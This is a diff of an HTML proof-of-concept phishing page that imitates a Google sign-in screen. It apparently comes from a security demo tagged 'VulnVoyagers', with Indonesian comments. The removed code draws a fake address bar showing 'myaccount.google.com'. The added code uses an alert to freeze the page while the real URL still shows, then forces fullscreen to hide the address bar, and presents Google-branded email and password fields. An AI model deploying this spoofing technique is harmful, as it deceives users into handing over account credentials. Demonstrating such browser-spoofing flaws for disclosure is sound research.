@@ -3,36 +3,29 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { margin: 0; font-family: Arial, sans-serif; background: #fff; text-align: center; }
-        .fake-omnibox { width: 100%; height: 50px; background: #f1f3f4; border-bottom: 1px solid #ccc; display: flex; align-items: center; padding: 0 10px; box-sizing: border-box; }
-        .url-text { background: white; flex-grow: 1; margin: 0 10px; padding: 5px 10px; border-radius: 15px; font-size: 14px; text-align: left; border: 1px solid #ddd; }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .login-box { border: 1px solid #dadce0; padding: 20px; display: inline-block; border-radius: 8px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-    <div id="spoof-container">
-        <div class="fake-omnibox">
-            <span>&#128274;</span>
-            <div class="url-text">myaccount.google.com</div>
-        </div>
+    <script>
+        // ALERT INI YANG PENTING: Bikin UI nge-freeze pas Address Bar masih Google
+        alert("Sign in to continue"); 
         
-        <div style="padding: 40px 20px;">
-            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-            <h2>Sign in</h2>
-            <p>To continue, please verify your account</p>
-            <input type="password" placeholder="Enter password" style="width: 80%; padding: 12px; margin: 20px 0; border: 1px solid #dadce0; border-radius: 4px;">
-            <br>
-            <button onclick="alert('Data Sent to VulnVoyagers!')" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500;">Next</button>
-        </div>
+        // Setelah user klik OK, otomatis minta Fullscreen buat redressing
+        document.documentElement.requestFullscreen();
+    </script>
+
+    <div class="login-box">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+        <input type="email" placeholder="Email or phone">
+        <input type="password" placeholder="Enter your password">
+        <button style="background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:4px; width:100%;">Next</button>
     </div>
 
-    <script>
-    // Langsung minta fullscreen pas halamannya ke-load buat nutup Address Bar asli
-    window.onload = function() {
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen();
-        }
-    };
-    </script>
 </body>
 </html>
